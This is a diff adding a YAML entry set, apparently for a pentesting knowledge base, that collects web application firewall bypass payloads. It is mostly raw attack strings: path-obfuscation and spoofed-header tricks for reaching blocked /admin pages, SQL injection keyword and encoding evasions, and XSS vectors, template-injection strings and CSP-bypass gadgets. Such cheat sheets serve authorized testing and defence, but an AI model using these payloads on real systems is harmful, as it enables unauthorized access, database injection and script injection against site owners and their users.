@@ -1,0 +1,178 @@
+# WAF Bypass Techniques — 30+ methods collected from real pentesting experience
+# Category: waf_bypass
+
+- title: "403 Bypass — Path Confusion Techniques"
+  content: |
+    ## Path Obfuscation (30+ methods)
+
+    ### 1. URL Encoding Tricks
+    ```
+    /admin → /%61dmin
+    /admin → /%2e/admin (dot + path)
+    /admin → /admin/. (trailing dot)
+    /admin → /admin/..;/ (path traversal variant)
+    /admin → /;/admin (semicolon prefix)
+    /admin → /admin;/ (semicolon suffix)
+    /admin → //admin (double slash)
+    /admin → /./admin (dot directory)
+    /admin → /ADMIN (case toggle)
+    /admin → /admin%00 (null byte, older servers)
+    ```
+
+    ### 2. Extension Tricks
+    ```
+    /admin → /admin.php
+    /admin → /admin.json
+    /admin → /admin.aspx
+    /admin → /admin.html
+    ```
+
+    ### 3. Header-Based Bypass
+    ```
+    X-Original-URL: /admin
+    X-Rewrite-URL: /admin
+    X-Forwarded-For: 127.0.0.1
+    X-Forwarded-Host: 127.0.0.1
+    X-Forwarded-Proto: https
+    X-Custom-IP-Authorization: 127.0.0.1
+    X-ProxyUser-Ip: 127.0.0.1
+    ```
+
+    ### 4. HTTP Method Switching
+    ```
+    GET /admin → POST /admin
+    GET /admin → PUT /admin
+    GET /admin → PATCH /admin
+    GET /admin → OPTIONS /admin
+    ```
+
+    ### 5. Parameter Pollution
+    ```
+    ?id=1 → ?id=1&id=2
+    ?role=user → ?role=admin&role=user
+    ```
+  tags: ["403", bypass, path-traversal, http-headers, method-switching, url-encoding]
+  keywords: [403绕过, 路径绕过, http方法切换, header欺骗, 参数污染, 路径混淆]
+  severity: high
+  references:
+    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses
+
+- title: "SQL Injection WAF Bypass — Encoding & Obfuscation"
+  content: |
+    ## SQLi WAF Bypass Techniques
+
+    ### 1. Comment Injection
+    ```sql
+    SELECT/**/1/**/FROM/**/users  -- inline comments
+    SEL/**/ECT 1 FR/**/OM users  -- break keywords
+    SELECT/*!500001*/ 1  -- MySQL versioned comment
+    ```
+
+    ### 2. Whitespace Alternatives
+    ```sql
+    SELECT%0A1%0AFROM%0Ausers    -- newline
+    SELECT%0D1%0DFROM%0Dusers    -- CR
+    SELECT%091%09FROM%09users    -- tab
+    SELECT%0B1%0BFROM%0Busers    -- vertical tab
+    SELECT%0C1%0CFROM%0Cusers    -- form feed
+    ```
+
+    ### 3. Encoding Bypass
+    ```sql
+    -- URL double encoding
+    %2527 → ' (double encoded quote)
+    -- Unicode
+    %u0027 → '
+    -- Hex
+    0x73656c656374 → "select"
+    -- Char function
+    CHAR(115,101,108,101,99,116) → "select"
+    ```
+
+    ### 4. Case & Keyword Obfuscation
+    ```sql
+    SeLeCt → SELECT
+    sElEcT → SELECT
+    SELect/**/1/*!from*/users  -- combo
+    ```
+
+    ### 5. Logical Operator Bypass
+    ```sql
+    -- When AND/OR are blocked
+    && → AND
+    || → OR
+    = → LIKE
+    != → <>
+    1=1 → 1>0, 1<2, 2 BETWEEN 1 AND 3
+    ```
+
+    ### 6. Database-Specific Functions
+    ```sql
+    -- MySQL
+    /*!50000SELECT*/ 1  -- versioned comment execution
+    -- PostgreSQL
+    SELECT CHR(65)||CHR(66)  -- string concat without quotes
+    -- MSSQL
+    SELECT CHAR(65)+CHAR(66)  -- CHAR function
+    ```
+  tags: [sql-injection, waf-bypass, encoding, obfuscation, mysql, mssql, postgresql]
+  keywords: [sql注入绕过, waf绕过, 编码绕过, 注释绕过, 关键字混淆]
+  severity: critical
+
+- title: "XSS WAF Bypass — Tag & Event Handler Techniques"
+  content: |
+    ## XSS WAF Bypass Methods
+
+    ### 1. Less Common Tags
+    ```html
+    <body onload=alert(1)>
+    <svg onload=alert(1)>
+    <img src=x onerror=alert(1)>
+    <details open ontoggle=alert(1)>
+    <marquee onstart=alert(1)>
+    <video><source onerror=alert(1)>
+    <audio src=x onerror=alert(1)>
+    <input autofocus onfocus=alert(1)>
+    <select autofocus onfocus=alert(1)>
+    <textarea autofocus onfocus=alert(1)>
+    <keygen autofocus onfocus=alert(1)>
+    ```
+
+    ### 2. Event Handler Obfuscation
+    ```html
+    <img src=x oNeRrOr=alert(1)>      <!-- case toggle -->
+    <img src=x onerror%0D=alert(1)>    <!-- CR injection -->
+    <img src=x onerror/**/=alert(1)>   <!-- comment injection -->
+    <img src=x onerror
+    =alert(1)>                         <!-- newline -->
+    ```
+
+    ### 3. Protocol Bypass
+    ```html
+    <a href="javascript:alert(1)">click</a>
+    <a href="data:text/html,<script>alert(1)</script>">click</a>
+    <a href="vbscript:alert(1)">click (IE)</a>
+    ```
+
+    ### 4. Encoding Tricks
+    ```html
+    <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">      <!-- HTML entity -->
+    <img src=x onerror="\x61\x6c\x65\x72\x74(1)">                <!-- hex -->
+    <img src=x onerror="alert(1)">      <!-- unicode -->
+    ```
+
+    ### 5. Template Injection Combos
+    ```html
+    {{constructor.constructor('alert(1)')()}}     <!-- AngularJS -->
+    ${alert(1)}                                     <!-- JS template -->
+    #{alert(1)}                                     <!-- various -->
+    <%= alert(1) %>                                 <!-- EJS/ERB -->
+    ```
+
+    ### 6. CSP Bypass (Bonus)
+    - JSONP endpoints: `<script src="/api/jsonp?callback=alert(1)">`
+    - CDN whitelists: use allowed CDN for script gadgets
+    - DOM clobbering: overwrite config variables via HTML
+  tags: [xss, waf-bypass, html-encoding, csp-bypass, event-handlers]
+  keywords: [xss绕过, waf绕过, html编码, 事件句柄, csp绕过, 跨站脚本绕过]
+  severity: high
